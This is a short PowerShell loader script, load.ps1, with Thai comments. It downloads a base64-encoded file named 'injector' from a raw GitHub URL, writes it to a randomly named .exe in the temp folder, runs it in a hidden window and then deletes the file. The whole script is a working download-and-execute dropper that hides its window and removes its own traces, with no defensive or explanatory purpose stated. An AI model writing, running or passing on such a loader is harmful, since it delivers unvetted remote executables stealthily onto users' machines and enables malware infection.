# load.ps1
$url = "https://raw.githubusercontent.com/puddyeieiei/dydestiny/main/injector.b64"

Write-Host "[*] Downloading injector from GitHub..." -ForegroundColor Cyan

try {
    $base64 = (iwr -UseBasicParsing $url).Content
    $bytes = [Convert]::FromBase64String($base64)
    
    # ใช้ชื่อไฟล์สุ่ม + นามสกุล .exe
    $tempFile = "$env:TEMP\$([System.Guid]::NewGuid().ToString()).exe"
    [IO.File]::WriteAllBytes($tempFile, $bytes)
    
    Write-Host "[*] Running injector..." -ForegroundColor Cyan
    Start-Process $tempFile -WindowStyle Hidden -Wait
    
    # ลบไฟล์
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
    
    Write-Host "[+] Done!" -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed: $_" -ForegroundColor Red
}
